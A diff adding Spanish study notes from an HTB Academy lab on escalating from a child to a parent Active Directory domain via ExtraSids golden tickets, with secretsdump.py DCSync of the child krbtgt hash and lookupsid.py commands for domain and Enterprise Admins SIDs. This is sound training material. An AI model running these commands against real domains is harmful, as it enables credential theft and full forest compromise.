@@ -1885,5 +1885,44 @@ Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | sele
 
 
 ```
+Para hacer este ataque se tiene que tener comprometido el child domain y la cuenta (The KRBTGT hash for the child domain). ( si quieres ver mas ve a la pagina es muy extenso)
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/5ed05d30-d6cd-47fc-ad23-c7ee99d582b5)
 
 
+Ya que se ingreso el golden ticket en la memoria
+
+```
+ls \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids
+ls \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\c$\ExtraSids\flag.txt
+```
+
+### En linux
+
+Para obtener la info pero desde linux Primero DCSYNC
+
+```
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+```
+
+Para encontrar el SID del child domain
+
+```
+ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
+```
+Aqui recuerda que se hace contra el DC ( nose porque pero desde que empece a estudiar asi es)
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/a6c4582f-9283-49c7-a902-2408b7e80a9e)
+
+El siguiente comando lo usa para encontrar el SID del grupo Enterprise Admins ( ve como es contra el DC del dominio parent)
+
+```
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+```
+
+Algo super interesante si nos damos cuenta en la captura el SID del grupo Enterprise Admins se le agrega solamente el 519 al final y dependiendo de que grupo seria lo que se le agregaria.
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/d5396e50-4840-461f-b26a-8b0469466fcc)
+
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/c0930dc0-ccad-4495-b4d5-e8470e71a038)
